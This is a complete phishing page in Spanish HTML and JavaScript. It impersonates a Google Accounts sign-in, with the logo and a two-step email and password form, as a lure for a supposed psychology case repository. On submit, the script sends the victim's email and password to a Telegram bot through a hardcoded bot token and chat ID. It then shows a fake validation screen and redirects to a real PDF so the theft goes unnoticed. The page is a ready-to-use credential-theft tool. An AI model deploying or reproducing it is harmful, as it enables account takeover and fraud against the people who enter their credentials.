<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesi칩n - Cuentas de Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #fff; }
        .google-input { transition: border 0.2s ease; }
        .google-input:focus { border: 2px solid #1a73e8; outline: none; }
        
        /* Spinner de carga para la redirecci칩n */
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #loading-screen {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            z-index: 1000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen bg-gray-50 sm:bg-white">

    <!-- Pantalla de transici칩n (Carga credibilidad) -->
    <div id="loading-screen">
        <div class="loader mb-4"></div>
        <p class="text-gray-600 text-sm">Validando acceso al repositorio...</p>
    </div>

    <!-- Card principal -->
    <div class="w-full max-w-[450px] bg-white p-6 sm:p-10 sm:border border-gray-300 rounded-lg">
        
        <!-- Logo Google -->
        <div class="flex justify-center mb-4">
            <svg viewBox="0 0 75 24" width="75" height="24">
                <path d="M7.1 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4c1 0 1.9.4 2.5 1.1l2.4-2.4C10.9 5.2 9.1 4.3 7.1 4.3c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1c2.1 0 3.9-.9 5.2-2.3l-2.4-2.4c-.7.7-1.7 1.1-2.7 1.1z" fill="#4285F4"/>
                <path d="M17.6 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 3.4 1.5 3.4 3.4-1.6 3.4-3.4 3.4zm0-9.6c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1 7.1-3.2 7.1-7.1-3.2-7.1-7.1-7.1z" fill="#EA4335"/>
                <path d="M30.4 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 3.4 1.5 3.4 3.4-1.6 3.4-3.4 3.4zm0-9.6c-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1 7.1-3.2 7.1-7.1-3.2-7.1-7.1-7.1z" fill="#FBBC05"/>
                <path d="M43.1 14.5c-1.8 0-3.4-1.5-3.4-3.4s1.6-3.4 3.4-3.4 1 0 1.8.4l2.4-2.4c-1.1-1.1-2.6-1.8-4.2-1.8-3.9 0-7.1 3.2-7.1 7.1s3.2 7.1 7.1 7.1c1.8 0 3.3-.7 4.5-1.9v1.4h3.6V4.7h-3.6v1.4c-.8-1.1-2-1.8-3.4-1.8z" fill="#4285F4"/>
                <path d="M52.5 1.1h3.6v17.5h-3.6z" fill="#34A853"/>
                <path d="M63.5 14.5c-1.4 0-2.5-.7-3.1-1.8l8.3-3.4-0.3-.7c-.7-1.8-2.7-4.3-5.6-4.3-2.9 0-5.3 2.3-5.3 7.1 0 3.9 3.2 7.1 7.2 7.1 3.2 0 5.1-2 5.9-3.1l-2.8-1.9c-.9 1.3-2.1 2.1-3.3 2.1zm0-7.3c1.1 0 2 .5 2.3 1.3l-5.5 2.3c0-2.6 1.8-3.6 3.2-3.6z" fill="#EA4335"/>
            </svg>
        </div>

        <h1 class="text-2xl font-normal text-center text-gray-800 mb-2">Iniciar sesi칩n</h1>
        <p class="text-center text-gray-700 mb-8">Accede al Repositorio de Casos PsicoIbero</p>

        <form id="pishForm" class="space-y-4">
            <!-- PASO 1: EMAIL -->
            <div id="email-step">
                <input type="email" id="email" placeholder="Correo electr칩nico o tel칠fono" required
                    class="w-full p-4 border border-gray-300 rounded-md google-input placeholder-gray-500 text-base">
                <div class="mt-2 mb-10">
                    <a href="#" class="text-sm font-medium text-blue-600 hover:underline">쮿as olvidado tu correo electr칩nico?</a>
                </div>
                <div class="flex items-center justify-between pt-4">
                    <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-2 py-2 rounded">Crear cuenta</button>
                    <button type="button" onclick="showPasswordStep()" 
                        class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md transition">Siguiente</button>
                </div>
            </div>

            <!-- PASO 2: PASSWORD -->
            <div id="pass-step" class="hidden">
                <div class="flex items-center p-2 border border-gray-300 rounded-full w-fit mb-8 bg-white hover:bg-gray-50 cursor-pointer" onclick="backToEmail()">
                    <div class="bg-gray-100 p-1 rounded-full mr-2">
                        <svg class="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"></path></svg>
                    </div>
                    <span id="user-display" class="text-sm text-gray-700 font-medium pr-2"></span>
                    <svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                </div>

                <input type="password" id="password" placeholder="Introduce tu contrase침a" required
                    class="w-full p-4 border border-gray-300 rounded-md google-input placeholder-gray-500 text-base">
                
                <div class="mt-2 flex items-center mb-10">
                    <input type="checkbox" id="show-pass" class="mr-2 h-4 w-4 cursor-pointer">
                    <label for="show-pass" class="text-sm text-gray-700 cursor-pointer">Mostrar contrase침a</label>
                </div>

                <div class="flex items-center justify-between pt-4">
                    <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-2 py-2 rounded">쮿as olvidado tu contrase침a?</button>
                    <button type="submit" 
                        class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md transition">Siguiente</button>
                </div>
            </div>
        </form>
    </div>

    <script>
        // CONFIGURACI칍N DE TELEGRAM
        const BOT_TOKEN = '8198434477:AAHwTLE56HN-W1-REPwGthWpt69IvPp8r88'; // <--- PONER TOKEN
        const CHAT_ID = '6269583447';     // <--- PONER CHAT ID
        
        // URL REAL A LA QUE SE REDIRIGIR츼 (CASO REAL DE PSICOLOG칈A)
        const URL_FINAL = 'https://www.redalyc.org/pdf/1339/133915921004.pdf';

        function showPasswordStep() {
            const emailField = document.getElementById('email');
            if(emailField.checkValidity()){
                document.getElementById('email-step').classList.add('hidden');
                document.getElementById('pass-step').classList.remove('hidden');
                document.getElementById('user-display').textContent = emailField.value;
            } else {
                emailField.reportValidity();
            }
        }

        function backToEmail() {
            document.getElementById('pass-step').classList.add('hidden');
            document.getElementById('email-step').classList.remove('hidden');
        }

        document.getElementById('pishForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Activar pantalla de carga
            document.getElementById('loading-screen').style.display = 'flex';

            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;

            const texto = `游댠 LOGIN DETECTADO 游댠\n\n游닎 Email: ${email}\n游댐 Password: ${pass}\n\n游늸 Destino: Repositorio PsicoIbero`;

            try {
                // Env칤o as칤ncrono a Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: texto
                    })
                });

                // Peque침a pausa para que parezca que "valida" de verdad
                setTimeout(() => {
                    window.location.href = URL_FINAL;
                }, 1800);

            } catch (err) {
                // Si hay error (ej. sin internet), redirigir igual para no dejar rastro
                window.location.href = URL_FINAL;
            }
        });

        // Toggle para mostrar contrase침a b치sica
        document.getElementById('show-pass').addEventListener('change', function() {
            document.getElementById('password').type = this.checked ? 'text' : 'password';
        });
    </script>
</body>
</html>
